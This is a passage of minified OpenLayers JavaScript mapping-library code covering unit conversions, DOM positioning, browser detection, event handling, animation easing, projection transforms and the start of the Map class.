odAmFt:0.304812252984506/\nOpenLayers.METERS_PER_INCH,Fathom:1.8288/OpenLayers.METERS_PER_INCH,\"NautM-UK\":1853.184/OpenLayers.METERS_PER_INCH,\"50kilometers\":5E4/OpenLayers.METERS_PER_INCH,\"150kilometers\":15E4/OpenLayers.METERS_PER_INCH});\nOpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{mm:OpenLayers.INCHES_PER_UNIT.Meter/1E3,cm:OpenLayers.INCHES_PER_UNIT.Meter/100,dm:100*OpenLayers.INCHES_PER_UNIT.Meter,km:1E3*OpenLayers.INCHES_PER_UNIT.Meter,kmi:OpenLayers.INCHES_PER_UNIT.nmi,fath:OpenLayers.INCHES_PER_UNIT.Fathom,ch:OpenLayers.INCHES_PER_UNIT.IntnlChain,link:OpenLayers.INCHES_PER_UNIT.IntnlLink,\"us-in\":OpenLayers.INCHES_PER_UNIT.inches,\"us-ft\":OpenLayers.INCHES_PER_UNIT.Foot,\"us-yd\":OpenLayers.INCHES_PER_UNIT.Yard,\"us-ch\":OpenLayers.INCHES_PER_UNIT.GunterChain,\n\"us-mi\":OpenLayers.INCHES_PER_UNIT.Mile,\"ind-yd\":OpenLayers.INCHES_PER_UNIT.IndianYd37,\"ind-ft\":OpenLayers.INCHES_PER_UNIT.IndianFt37,\"ind-ch\":20.11669506/OpenLayers.METERS_PER_INCH});OpenLayers.DOTS_PER_INCH=72;OpenLayers.Util.normalizeScale=function(a){return 1<a?1/a:a};OpenLayers.Util.getResolutionFromScale=function(a,b){var c;a&&(null==b&&(b=\"degrees\"),c=1/(OpenLayers.Util.normalizeScale(a)*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH));return c};\nOpenLayers.Util.getScaleFromResolution=function(a,b){null==b&&(b=\"degrees\");return a*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH};\nOpenLayers.Util.pagePosition=function(a){var b=[0,0],c=OpenLayers.Util.getViewportElement();if(!a||a==window||a==c)return b;var d=OpenLayers.IS_GECKO&&document.getBoxObjectFor&&\"absolute\"==OpenLayers.Element.getStyle(a,\"position\")&&(\"\"==a.style.top||\"\"==a.style.left),e=null;if(a.getBoundingClientRect)a=a.getBoundingClientRect(),e=window.pageYOffset||c.scrollTop,b[0]=a.left+(window.pageXOffset||c.scrollLeft),b[1]=a.top+e;else if(document.getBoxObjectFor&&!d)a=document.getBoxObjectFor(a),c=document.getBoxObjectFor(c),\nb[0]=a.screenX-c.screenX,b[1]=a.screenY-c.screenY;else{b[0]=a.offsetLeft;b[1]=a.offsetTop;e=a.offsetParent;if(e!=a)for(;e;)b[0]+=e.offsetLeft,b[1]+=e.offsetTop,e=e.offsetParent;c=OpenLayers.BROWSER_NAME;if(\"opera\"==c||\"safari\"==c&&\"absolute\"==OpenLayers.Element.getStyle(a,\"position\"))b[1]-=document.body.offsetTop;for(e=a.offsetParent;e&&e!=document.body;){b[0]-=e.scrollLeft;if(\"opera\"!=c||\"TR\"!=e.tagName)b[1]-=e.scrollTop;e=e.offsetParent}}return b};\nOpenLayers.Util.getViewportElement=function(){var a=arguments.callee.viewportElement;void 0==a&&(a=\"msie\"==OpenLayers.BROWSER_NAME&&\"CSS1Compat\"!=document.compatMode?document.body:document.documentElement,arguments.callee.viewportElement=a);return a};\nOpenLayers.Util.isEquivalentUrl=function(a,b,c){c=c||{};OpenLayers.Util.applyDefaults(c,{ignoreCase:!0,ignorePort80:!0,ignoreHash:!0,splitArgs:!1});a=OpenLayers.Util.createUrlObject(a,c);b=OpenLayers.Util.createUrlObject(b,c);for(var d in a)if(\"args\"!==d&&a[d]!=b[d])return!1;for(d in a.args){if(a.args[d]!=b.args[d])return!1;delete b.args[d]}for(d in b.args)return!1;return!0};\nOpenLayers.Util.createUrlObject=function(a,b){b=b||{};if(!/^\\w+:\\/\\//.test(a)){var c=window.location,d=c.port?\":\"+c.port:\"\",d=c.protocol+\"//\"+c.host.split(\":\").shift()+d;0===a.indexOf(\"/\")?a=d+a:(c=c.pathname.split(\"/\"),c.pop(),a=d+c.join(\"/\")+\"/\"+a)}b.ignoreCase&&(a=a.toLowerCase());c=document.createElement(\"a\");c.href=a;d={};d.host=c.host.split(\":\").shift();d.protocol=c.protocol;d.port=b.ignorePort80?\"80\"==c.port||\"0\"==c.port?\"\":c.port:\"\"==c.port||\"0\"==c.port?\"80\":c.port;d.hash=b.ignoreHash||\"#\"===\nc.hash?\"\":c.hash;var e=c.search;e||(e=a.indexOf(\"?\"),e=-1!=e?a.substr(e):\"\");d.args=OpenLayers.Util.getParameters(e,{splitArgs:b.splitArgs});d.pathname=\"/\"==c.pathname.charAt(0)?c.pathname:\"/\"+c.pathname;return d};OpenLayers.Util.removeTail=function(a){var b=null,b=a.indexOf(\"?\"),c=a.indexOf(\"#\");return b=-1==b?-1!=c?a.substr(0,c):a:-1!=c?a.substr(0,Math.min(b,c)):a.substr(0,b)};OpenLayers.IS_GECKO=function(){var a=navigator.userAgent.toLowerCase();return-1==a.indexOf(\"webkit\")&&-1!=a.indexOf(\"gecko\")}();\nOpenLayers.CANVAS_SUPPORTED=function(){var a=document.createElement(\"canvas\");return!(!a.getContext||!a.getContext(\"2d\"))}();OpenLayers.BROWSER_NAME=function(){var a=\"\",b=navigator.userAgent.toLowerCase();-1!=b.indexOf(\"opera\")?a=\"opera\":-1!=b.indexOf(\"msie\")?a=\"msie\":-1!=b.indexOf(\"safari\")?a=\"safari\":-1!=b.indexOf(\"mozilla\")&&(a=-1!=b.indexOf(\"firefox\")?\"firefox\":\"mozilla\");return a}();OpenLayers.Util.getBrowserName=function(){return OpenLayers.BROWSER_NAME};\nOpenLayers.Util.getRenderedDimensions=function(a,b,c){var d,e,f=document.createElement(\"div\");f.style.visibility=\"hidden\";for(var g=c&&c.containerElement?c.containerElement:document.body,h=!1,k=null,l=g;l&&\"body\"!=l.tagName.toLowerCase();){var m=OpenLayers.Element.getStyle(l,\"position\");if(\"absolute\"==m){h=!0;break}else if(m&&\"static\"!=m)break;l=l.parentNode}!h||0!==g.clientHeight&&0!==g.clientWidth||(k=document.createElement(\"div\"),k.style.visibility=\"hidden\",k.style.position=\"absolute\",k.style.overflow=\n\"visible\",k.style.width=document.body.clientWidth+\"px\",k.style.height=document.body.clientHeight+\"px\",k.appendChild(f));f.style.position=\"absolute\";b&&(b.w?(d=b.w,f.style.width=d+\"px\"):b.h&&(e=b.h,f.style.height=e+\"px\"));c&&c.displayClass&&(f.className=c.displayClass);b=document.createElement(\"div\");b.innerHTML=a;b.style.overflow=\"visible\";if(b.childNodes)for(a=0,c=b.childNodes.length;a<c;a++)b.childNodes[a].style&&(b.childNodes[a].style.overflow=\"visible\");f.appendChild(b);k?g.appendChild(k):g.appendChild(f);\nd||(d=parseInt(b.scrollWidth),f.style.width=d+\"px\");e||(e=parseInt(b.scrollHeight));f.removeChild(b);k?(k.removeChild(f),g.removeChild(k)):g.removeChild(f);return new OpenLayers.Size(d,e)};\nOpenLayers.Util.getScrollbarWidth=function(){var a=OpenLayers.Util._scrollbarWidth;if(null==a){var b=null,c=null,b=a=0,b=document.createElement(\"div\");b.style.position=\"absolute\";b.style.top=\"-1000px\";b.style.left=\"-1000px\";b.style.width=\"100px\";b.style.height=\"50px\";b.style.overflow=\"hidden\";c=document.createElement(\"div\");c.style.width=\"100%\";c.style.height=\"200px\";b.appendChild(c);document.body.appendChild(b);a=c.offsetWidth;b.style.overflow=\"scroll\";b=c.offsetWidth;document.body.removeChild(document.body.lastChild);\nOpenLayers.Util._scrollbarWidth=a-b;a=OpenLayers.Util._scrollbarWidth}return a};\nOpenLayers.Util.getFormattedLonLat=function(a,b,c){c||(c=\"dms\");a=(a+540)%360-180;var d=Math.abs(a),e=Math.floor(d),f=d=(d-e)/(1/60),d=Math.floor(d),f=Math.round(10*((f-d)/(1/60))),f=f/10;60<=f&&(f-=60,d+=1,60<=d&&(d-=60,e+=1));10>e&&(e=\"0\"+e);e+=\"\\u00b0\";0<=c.indexOf(\"dm\")&&(10>d&&(d=\"0\"+d),e+=d+\"'\",0<=c.indexOf(\"dms\")&&(10>f&&(f=\"0\"+f),e+=f+'\"'));return e=\"lon\"==b?e+(0>a?OpenLayers.i18n(\"W\"):OpenLayers.i18n(\"E\")):e+(0>a?OpenLayers.i18n(\"S\"):OpenLayers.i18n(\"N\"))};OpenLayers.Format=OpenLayers.Class({options:null,externalProjection:null,internalProjection:null,data:null,keepData:!1,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a},destroy:function(){},read:function(a){throw Error(\"Read not implemented.\");},write:function(a){throw Error(\"Write not implemented.\");},CLASS_NAME:\"OpenLayers.Format\"});OpenLayers.Format.CSWGetRecords=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetRecords.DEFAULTS);var b=OpenLayers.Format.CSWGetRecords[\"v\"+a.version.replace(/\\./g,\"_\")];if(!b)throw\"Unsupported CSWGetRecords version: \"+a.version;return new b(a)};OpenLayers.Format.CSWGetRecords.DEFAULTS={version:\"2.0.2\"};OpenLayers.Control=OpenLayers.Class({id:null,map:null,div:null,type:null,allowSelection:!1,displayClass:\"\",title:\"\",autoActivate:!1,active:null,handlerOptions:null,handler:null,eventListeners:null,events:null,initialize:function(a){this.displayClass=this.CLASS_NAME.replace(\"OpenLayers.\",\"ol\").replace(/\\./g,\"\");OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);null==this.id&&(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\n\"_\"))},destroy:function(){this.events&&(this.eventListeners&&this.events.un(this.eventListeners),this.events.destroy(),this.events=null);this.eventListeners=null;this.handler&&(this.handler.destroy(),this.handler=null);if(this.handlers){for(var a in this.handlers)this.handlers.hasOwnProperty(a)&&\"function\"==typeof this.handlers[a].destroy&&this.handlers[a].destroy();this.handlers=null}this.map&&(this.map.removeControl(this),this.map=null);this.div=null},setMap:function(a){this.map=a;this.handler&&\nthis.handler.setMap(a)},draw:function(a){null==this.div&&(this.div=OpenLayers.Util.createDiv(this.id),this.div.className=this.displayClass,this.allowSelection||(this.div.className+=\" olControlNoSelect\",this.div.setAttribute(\"unselectable\",\"on\",0),this.div.onselectstart=OpenLayers.Function.False),\"\"!=this.title&&(this.div.title=this.title));null!=a&&(this.position=a.clone());this.moveTo(this.position);return this.div},moveTo:function(a){null!=a&&null!=this.div&&(this.div.style.left=a.x+\"px\",this.div.style.top=\na.y+\"px\")},activate:function(){if(this.active)return!1;this.handler&&this.handler.activate();this.active=!0;this.map&&OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,\"\")+\"Active\");this.events.triggerEvent(\"activate\");return!0},deactivate:function(){return this.active?(this.handler&&this.handler.deactivate(),this.active=!1,this.map&&OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,\"\")+\"Active\"),this.events.triggerEvent(\"deactivate\"),\n!0):!1},CLASS_NAME:\"OpenLayers.Control\"});OpenLayers.Control.TYPE_BUTTON=1;OpenLayers.Control.TYPE_TOGGLE=2;OpenLayers.Control.TYPE_TOOL=3;OpenLayers.Event={observers:!1,KEY_SPACE:32,KEY_BACKSPACE:8,KEY_TAB:9,KEY_RETURN:13,KEY_ESC:27,KEY_LEFT:37,KEY_UP:38,KEY_RIGHT:39,KEY_DOWN:40,KEY_DELETE:46,element:function(a){return a.target||a.srcElement},isSingleTouch:function(a){return a.touches&&1==a.touches.length},isMultiTouch:function(a){return a.touches&&1<a.touches.length},isLeftClick:function(a){return a.which&&1==a.which||a.button&&1==a.button},isRightClick:function(a){return a.which&&3==a.which||a.button&&2==a.button},stop:function(a,\nb){b||OpenLayers.Event.preventDefault(a);a.stopPropagation?a.stopPropagation():a.cancelBubble=!0},preventDefault:function(a){a.preventDefault?a.preventDefault():a.returnValue=!1},findElement:function(a,b){for(var c=OpenLayers.Event.element(a);c.parentNode&&(!c.tagName||c.tagName.toUpperCase()!=b.toUpperCase());)c=c.parentNode;return c},observe:function(a,b,c,d){a=OpenLayers.Util.getElement(a);d=d||!1;\"keypress\"==b&&(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.attachEvent)&&(b=\"keydown\");\nthis.observers||(this.observers={});if(!a._eventCacheID){var e=\"eventCacheID_\";a.id&&(e=a.id+\"_\"+e);a._eventCacheID=OpenLayers.Util.createUniqueID(e)}e=a._eventCacheID;this.observers[e]||(this.observers[e]=[]);this.observers[e].push({element:a,name:b,observer:c,useCapture:d});a.addEventListener?a.addEventListener(b,c,d):a.attachEvent&&a.attachEvent(\"on\"+b,c)},stopObservingElement:function(a){a=OpenLayers.Util.getElement(a)._eventCacheID;this._removeElementObservers(OpenLayers.Event.observers[a])},\n_removeElementObservers:function(a){if(a)for(var b=a.length-1;0<=b;b--){var c=a[b];OpenLayers.Event.stopObserving.apply(this,[c.element,c.name,c.observer,c.useCapture])}},stopObserving:function(a,b,c,d){d=d||!1;a=OpenLayers.Util.getElement(a);var e=a._eventCacheID;\"keypress\"==b&&(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.detachEvent)&&(b=\"keydown\");var f=!1,g=OpenLayers.Event.observers[e];if(g)for(var h=0;!f&&h<g.length;){var k=g[h];if(k.name==b&&k.observer==c&&k.useCapture==d){g.splice(h,\n1);0==g.length&&delete OpenLayers.Event.observers[e];f=!0;break}h++}f&&(a.removeEventListener?a.removeEventListener(b,c,d):a&&a.detachEvent&&a.detachEvent(\"on\"+b,c));return f},unloadCache:function(){if(OpenLayers.Event&&OpenLayers.Event.observers){for(var a in OpenLayers.Event.observers)OpenLayers.Event._removeElementObservers.apply(this,[OpenLayers.Event.observers[a]]);OpenLayers.Event.observers=!1}},CLASS_NAME:\"OpenLayers.Event\"};\nOpenLayers.Event.observe(window,\"unload\",OpenLayers.Event.unloadCache,!1);\nOpenLayers.Events=OpenLayers.Class({BROWSER_EVENTS:\"mouseover mouseout mousedown mouseup mousemove click dblclick rightclick dblrightclick resize focus blur touchstart touchmove touchend keydown\".split(\" \"),listeners:null,object:null,element:null,eventHandler:null,fallThrough:null,includeXY:!1,extensions:null,extensionCount:null,clearMouseListener:null,initialize:function(a,b,c,d,e){OpenLayers.Util.extend(this,e);this.object=a;this.fallThrough=d;this.listeners={};this.extensions={};this.extensionCount=\n{};this._msTouches=[];null!=b&&this.attachToElement(b)},destroy:function(){for(var a in this.extensions)\"boolean\"!==typeof this.extensions[a]&&this.extensions[a].destroy();this.extensions=null;this.element&&(OpenLayers.Event.stopObservingElement(this.element),this.element.hasScrollEvent&&OpenLayers.Event.stopObserving(window,\"scroll\",this.clearMouseListener));this.eventHandler=this.fallThrough=this.object=this.listeners=this.element=null},addEventType:function(a){},attachToElement:function(a){this.element?\nOpenLayers.Event.stopObservingElement(this.element):(this.eventHandler=OpenLayers.Function.bindAsEventListener(this.handleBrowserEvent,this),this.clearMouseListener=OpenLayers.Function.bind(this.clearMouseCache,this));this.element=a;for(var b=!!window.navigator.msMaxTouchPoints,c,d=0,e=this.BROWSER_EVENTS.length;d<e;d++)c=this.BROWSER_EVENTS[d],OpenLayers.Event.observe(a,c,this.eventHandler),b&&0===c.indexOf(\"touch\")&&this.addMsTouchListener(a,c,this.eventHandler);OpenLayers.Event.observe(a,\"dragstart\",\nOpenLayers.Event.stop)},on:function(a){for(var b in a)\"scope\"!=b&&a.hasOwnProperty(b)&&this.register(b,a.scope,a[b])},register:function(a,b,c,d){a in OpenLayers.Events&&!this.extensions[a]&&(this.extensions[a]=new OpenLayers.Events[a](this));if(null!=c){null==b&&(b=this.object);var e=this.listeners[a];e||(e=[],this.listeners[a]=e,this.extensionCount[a]=0);b={obj:b,func:c};d?(e.splice(this.extensionCount[a],0,b),\"object\"===typeof d&&d.extension&&this.extensionCount[a]++):e.push(b)}},registerPriority:function(a,\nb,c){this.register(a,b,c,!0)},un:function(a){for(var b in a)\"scope\"!=b&&a.hasOwnProperty(b)&&this.unregister(b,a.scope,a[b])},unregister:function(a,b,c){null==b&&(b=this.object);a=this.listeners[a];if(null!=a)for(var d=0,e=a.length;d<e;d++)if(a[d].obj==b&&a[d].func==c){a.splice(d,1);break}},remove:function(a){null!=this.listeners[a]&&(this.listeners[a]=[])},triggerEvent:function(a,b){var c=this.listeners[a];if(c&&0!=c.length){null==b&&(b={});b.object=this.object;b.element=this.element;b.type||(b.type=\na);for(var c=c.slice(),d,e=0,f=c.length;e<f&&(d=c[e],d=d.func.apply(d.obj,[b]),void 0==d||!1!=d);e++);this.fallThrough||OpenLayers.Event.stop(b,!0);return d}},handleBrowserEvent:function(a){var b=a.type,c=this.listeners[b];if(c&&0!=c.length){if((c=a.touches)&&c[0]){for(var d=0,e=0,f=c.length,g,h=0;h<f;++h)g=this.getTouchClientXY(c[h]),d+=g.clientX,e+=g.clientY;a.clientX=d/f;a.clientY=e/f}this.includeXY&&(a.xy=this.getMousePosition(a));this.triggerEvent(b,a)}},getTouchClientXY:function(a){var b=window.olMockWin||\nwindow,c=b.pageXOffset,b=b.pageYOffset,d=a.clientX,e=a.clientY;if(0===a.pageY&&Math.floor(e)>Math.floor(a.pageY)||0===a.pageX&&Math.floor(d)>Math.floor(a.pageX))d-=c,e-=b;else if(e<a.pageY-b||d<a.pageX-c)d=a.pageX-c,e=a.pageY-b;a.olClientX=d;a.olClientY=e;return{clientX:d,clientY:e}},clearMouseCache:function(){this.element.scrolls=null;this.element.lefttop=null;this.element.offsets=null},getMousePosition:function(a){this.includeXY?this.element.hasScrollEvent||(OpenLayers.Event.observe(window,\"scroll\",\nthis.clearMouseListener),this.element.hasScrollEvent=!0):this.clearMouseCache();if(!this.element.scrolls){var b=OpenLayers.Util.getViewportElement();this.element.scrolls=[window.pageXOffset||b.scrollLeft,window.pageYOffset||b.scrollTop]}this.element.lefttop||(this.element.lefttop=[document.documentElement.clientLeft||0,document.documentElement.clientTop||0]);this.element.offsets||(this.element.offsets=OpenLayers.Util.pagePosition(this.element));return new OpenLayers.Pixel(a.clientX+this.element.scrolls[0]-\nthis.element.offsets[0]-this.element.lefttop[0],a.clientY+this.element.scrolls[1]-this.element.offsets[1]-this.element.lefttop[1])},addMsTouchListener:function(a,b,c){function d(a){c(OpenLayers.Util.applyDefaults({stopPropagation:function(){for(var a=e.length-1;0<=a;--a)e[a].stopPropagation()},preventDefault:function(){for(var a=e.length-1;0<=a;--a)e[a].preventDefault()},type:b},a))}var e=this._msTouches;switch(b){case \"touchstart\":return this.addMsTouchListenerStart(a,b,d);case \"touchend\":return this.addMsTouchListenerEnd(a,\nb,d);case \"touchmove\":return this.addMsTouchListenerMove(a,b,d);default:throw\"Unknown touch event type\";}},addMsTouchListenerStart:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,\"MSPointerDown\",function(a){for(var b=!1,g=0,h=d.length;g<h;++g)if(d[g].pointerId==a.pointerId){b=!0;break}b||d.push(a);a.touches=d.slice();c(a)});OpenLayers.Event.observe(a,\"MSPointerUp\",function(a){for(var b=0,c=d.length;b<c;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}})},addMsTouchListenerMove:function(a,\nb,c){var d=this._msTouches;OpenLayers.Event.observe(a,\"MSPointerMove\",function(a){if(a.pointerType!=a.MSPOINTER_TYPE_MOUSE||0!=a.buttons)if(1!=d.length||d[0].pageX!=a.pageX||d[0].pageY!=a.pageY){for(var b=0,g=d.length;b<g;++b)if(d[b].pointerId==a.pointerId){d[b]=a;break}a.touches=d.slice();c(a)}})},addMsTouchListenerEnd:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,\"MSPointerUp\",function(a){for(var b=0,g=d.length;b<g;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}a.touches=\nd.slice();c(a)})},CLASS_NAME:\"OpenLayers.Events\"});OpenLayers.Events.buttonclick=OpenLayers.Class({target:null,events:\"mousedown mouseup click dblclick touchstart touchmove touchend keydown\".split(\" \"),startRegEx:/^mousedown|touchstart$/,cancelRegEx:/^touchmove$/,completeRegEx:/^mouseup|touchend$/,initialize:function(a){this.target=a;for(a=this.events.length-1;0<=a;--a)this.target.register(this.events[a],this,this.buttonClick,{extension:!0})},destroy:function(){for(var a=this.events.length-1;0<=a;--a)this.target.unregister(this.events[a],this,this.buttonClick);\ndelete this.target},getPressedButton:function(a){var b=3,c;do{if(OpenLayers.Element.hasClass(a,\"olButton\")){c=a;break}a=a.parentNode}while(0<--b&&a);return c},ignore:function(a){var b=3,c=!1;do{if(\"a\"===a.nodeName.toLowerCase()){c=!0;break}a=a.parentNode}while(0<--b&&a);return c},buttonClick:function(a){var b=!0,c=OpenLayers.Event.element(a);if(c&&(OpenLayers.Event.isLeftClick(a)||!~a.type.indexOf(\"mouse\")))if(c=this.getPressedButton(c)){if(\"keydown\"===a.type)switch(a.keyCode){case OpenLayers.Event.KEY_RETURN:case OpenLayers.Event.KEY_SPACE:this.target.triggerEvent(\"buttonclick\",\n{buttonElement:c}),OpenLayers.Event.stop(a),b=!1}else if(this.startEvt){if(this.completeRegEx.test(a.type)){var b=OpenLayers.Util.pagePosition(c),d=OpenLayers.Util.getViewportElement(),e=window.pageYOffset||d.scrollTop;b[0]-=window.pageXOffset||d.scrollLeft;b[1]-=e;this.target.triggerEvent(\"buttonclick\",{buttonElement:c,buttonXY:{x:this.startEvt.clientX-b[0],y:this.startEvt.clientY-b[1]}})}this.cancelRegEx.test(a.type)&&delete this.startEvt;OpenLayers.Event.stop(a);b=!1}this.startRegEx.test(a.type)&&\n(this.startEvt=a,OpenLayers.Event.stop(a),b=!1)}else b=!this.ignore(OpenLayers.Event.element(a)),delete this.startEvt;return b}});OpenLayers.Util=OpenLayers.Util||{};\nOpenLayers.Util.vendorPrefix=function(){function a(a){return a?a.replace(/([A-Z])/g,function(a){return\"-\"+a.toLowerCase()}).replace(/^ms-/,\"-ms-\"):null}function b(a,b){if(void 0===g[b]){var c,e=0,f=d.length,p=\"undefined\"!==typeof a.cssText;for(g[b]=null;e<f;e++)if((c=d[e])?(p||(c=c.toLowerCase()),c=c+b.charAt(0).toUpperCase()+b.slice(1)):c=b,void 0!==a[c]){g[b]=c;break}}return g[b]}function c(a){return b(e,a)}var d=[\"\",\"O\",\"ms\",\"Moz\",\"Webkit\"],e=document.createElement(\"div\").style,f={},g={};return{css:function(b){if(void 0===\nf[b]){var d=b.replace(/(-[\\s\\S])/g,function(a){return a.charAt(1).toUpperCase()}),d=c(d);f[b]=a(d)}return f[b]},js:b,style:c,cssCache:f,jsCache:g}}();OpenLayers.Animation=function(a){var b=OpenLayers.Util.vendorPrefix.js(a,\"requestAnimationFrame\"),c=!!b,d=function(){var c=a[b]||function(b,c){a.setTimeout(b,16)};return function(b,d){c.apply(a,[b,d])}}(),e=0,f={};return{isNative:c,requestFrame:d,start:function(a,b,c){b=0<b?b:Number.POSITIVE_INFINITY;var l=++e,m=+new Date;f[l]=function(){f[l]&&+new Date-m<=b?(a(),f[l]&&d(f[l],c)):delete f[l]};d(f[l],c);return l},stop:function(a){delete f[a]}}}(window);OpenLayers.Tween=OpenLayers.Class({easing:null,begin:null,finish:null,duration:null,callbacks:null,time:null,minFrameRate:null,startTime:null,animationId:null,playing:!1,initialize:function(a){this.easing=a?a:OpenLayers.Easing.Expo.easeOut},start:function(a,b,c,d){this.playing=!0;this.begin=a;this.finish=b;this.duration=c;this.callbacks=d.callbacks;this.minFrameRate=d.minFrameRate||30;this.time=0;this.startTime=(new Date).getTime();OpenLayers.Animation.stop(this.animationId);this.animationId=null;\nthis.callbacks&&this.callbacks.start&&this.callbacks.start.call(this,this.begin);this.animationId=OpenLayers.Animation.start(OpenLayers.Function.bind(this.play,this))},stop:function(){this.playing&&(this.callbacks&&this.callbacks.done&&this.callbacks.done.call(this,this.finish),OpenLayers.Animation.stop(this.animationId),this.animationId=null,this.playing=!1)},play:function(){var a={},b;for(b in this.begin){var c=this.begin[b],d=this.finish[b];if(null==c||null==d||isNaN(c)||isNaN(d))throw new TypeError(\"invalid value for Tween\");\na[b]=this.easing.apply(this,[this.time,c,d-c,this.duration])}this.time++;this.callbacks&&this.callbacks.eachStep&&((new Date).getTime()-this.startTime)/this.time<=1E3/this.minFrameRate&&this.callbacks.eachStep.call(this,a);this.time>this.duration&&this.stop()},CLASS_NAME:\"OpenLayers.Tween\"});OpenLayers.Easing={CLASS_NAME:\"OpenLayers.Easing\"};OpenLayers.Easing.Linear={easeIn:function(a,b,c,d){return c*a/d+b},easeOut:function(a,b,c,d){return c*a/d+b},easeInOut:function(a,b,c,d){return c*a/d+b},CLASS_NAME:\"OpenLayers.Easing.Linear\"};\nOpenLayers.Easing.Expo={easeIn:function(a,b,c,d){return 0==a?b:c*Math.pow(2,10*(a/d-1))+b},easeOut:function(a,b,c,d){return a==d?b+c:c*(-Math.pow(2,-10*a/d)+1)+b},easeInOut:function(a,b,c,d){return 0==a?b:a==d?b+c:1>(a/=d/2)?c/2*Math.pow(2,10*(a-1))+b:c/2*(-Math.pow(2,-10*--a)+2)+b},CLASS_NAME:\"OpenLayers.Easing.Expo\"};\nOpenLayers.Easing.Quad={easeIn:function(a,b,c,d){return c*(a/=d)*a+b},easeOut:function(a,b,c,d){return-c*(a/=d)*(a-2)+b},easeInOut:function(a,b,c,d){return 1>(a/=d/2)?c/2*a*a+b:-c/2*(--a*(a-2)-1)+b},CLASS_NAME:\"OpenLayers.Easing.Quad\"};OpenLayers.Projection=OpenLayers.Class({proj:null,projCode:null,titleRegEx:/\\+title=[^\\+]*/,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.projCode=a;\"object\"==typeof Proj4js&&(this.proj=new Proj4js.Proj(a))},getCode:function(){return this.proj?this.proj.srsCode:this.projCode},getUnits:function(){return this.proj?this.proj.units:null},toString:function(){return this.getCode()},equals:function(a){var b=!1;a&&(a instanceof OpenLayers.Projection||(a=new OpenLayers.Projection(a)),\"object\"==\ntypeof Proj4js&&this.proj.defData&&a.proj.defData?b=this.proj.defData.replace(this.titleRegEx,\"\")==a.proj.defData.replace(this.titleRegEx,\"\"):a.getCode&&(b=this.getCode(),a=a.getCode(),b=b==a||!!OpenLayers.Projection.transforms[b]&&OpenLayers.Projection.transforms[b][a]===OpenLayers.Projection.nullTransform));return b},destroy:function(){delete this.proj;delete this.projCode},CLASS_NAME:\"OpenLayers.Projection\"});OpenLayers.Projection.transforms={};\nOpenLayers.Projection.defaults={\"EPSG:4326\":{units:\"degrees\",maxExtent:[-180,-90,180,90],yx:!0},\"CRS:84\":{units:\"degrees\",maxExtent:[-180,-90,180,90]},\"EPSG:900913\":{units:\"m\",maxExtent:[-2.003750834E7,-2.003750834E7,2.003750834E7,2.003750834E7]}};\nOpenLayers.Projection.addTransform=function(a,b,c){if(c===OpenLayers.Projection.nullTransform){var d=OpenLayers.Projection.defaults[a];d&&!OpenLayers.Projection.defaults[b]&&(OpenLayers.Projection.defaults[b]=d)}OpenLayers.Projection.transforms[a]||(OpenLayers.Projection.transforms[a]={});OpenLayers.Projection.transforms[a][b]=c};\nOpenLayers.Projection.transform=function(a,b,c){if(b&&c)if(b instanceof OpenLayers.Projection||(b=new OpenLayers.Projection(b)),c instanceof OpenLayers.Projection||(c=new OpenLayers.Projection(c)),b.proj&&c.proj)a=Proj4js.transform(b.proj,c.proj,a);else{b=b.getCode();c=c.getCode();var d=OpenLayers.Projection.transforms;if(d[b]&&d[b][c])d[b][c](a)}return a};OpenLayers.Projection.nullTransform=function(a){return a};\n(function(){function a(a){a.x=180*a.x/d;a.y=180/Math.PI*(2*Math.atan(Math.exp(a.y/d*Math.PI))-Math.PI/2);return a}function b(a){a.x=a.x*d/180;var b=Math.log(Math.tan((90+a.y)*Math.PI/360))/Math.PI*d;a.y=Math.max(-2.003750834E7,Math.min(b,2.003750834E7));return a}function c(c,d){var e=OpenLayers.Projection.addTransform,f=OpenLayers.Projection.nullTransform,g,p,q,r,s;g=0;for(p=d.length;g<p;++g)for(q=d[g],e(c,q,b),e(q,c,a),s=g+1;s<p;++s)r=d[s],e(q,r,f),e(r,q,f)}var d=2.003750834E7,e=[\"EPSG:900913\",\"EPSG:3857\",\n\"EPSG:102113\",\"EPSG:102100\"],f=[\"CRS:84\",\"urn:ogc:def:crs:EPSG:6.6:4326\",\"EPSG:4326\"],g;for(g=e.length-1;0<=g;--g)c(e[g],f);for(g=f.length-1;0<=g;--g)c(f[g],e)})();OpenLayers.Map=OpenLayers.Class({Z_INDEX_BASE:{BaseLayer:100,Overlay:325,Feature:725,Popup:750,Control:1E3},id:null,fractionalZoom:!1,events:null,allOverlays:!1,div:null,dragging:!1,size:null,viewPortDiv:null,layerContainerOrigin:null,layerContainerDiv:null,layers:null,controls:null,popups:null,baseLayer:null,center:null,resolution:null,zoom:0,panRatio:1.5,options:null,tileSize:null,projection:\"EPSG:4326\",units:null,resolutions:null,maxResolution:null,minResolution:null,maxScale:null,minScale:null,\nmaxExtent:null,minExtent:null,restrictedExtent:null,numZoomLevels:16,theme:null,displayProjection:null,fallThrough:!1,autoUpdateSize:!0,eventListeners:null,panTween:null,panMethod:OpenLayers.Easing.Expo.easeOut,panDuration:50,zoomTween:null,zoomMethod:OpenLayers.Easing.Quad.easeOut,zoomDuration:20,paddingForPopups:null,layerContainerOriginPx:null,minPx:null,maxPx:null,initialize:function(a,b){1===arguments.length&&\"object\"===typeof a&&(a=(b=a)&&b.div);this.tileSize=new OpenLayers.Size(OpenLayers.Map.TILE_WIDTH,\nOpenLayers.Map.TILE_HEIGHT);this.paddingForPopups=new 